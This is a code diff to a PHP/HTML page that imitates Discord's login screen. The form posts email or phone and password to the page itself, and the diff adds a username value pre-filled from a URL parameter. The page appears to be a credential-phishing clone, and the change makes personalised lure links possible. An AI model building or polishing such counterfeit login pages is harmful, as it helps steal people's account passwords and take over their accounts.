@@ -70,7 +70,7 @@
 <div class="login-container">
     <form class="login-form" action="" method="post">
         <h2>Log in to Discord</h2>
-        <input type="text" name="username" placeholder="Email or Phone Number" required>
+        <input type="text" name="username" placeholder="Email or Phone Number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
         <input type="password" name="password" placeholder="Password" required>
         <button type="submit">Log In</button>
         <div class="signup-link"> Don't have an account? <a href="https://discord.com/register">Sign Up</a></div>
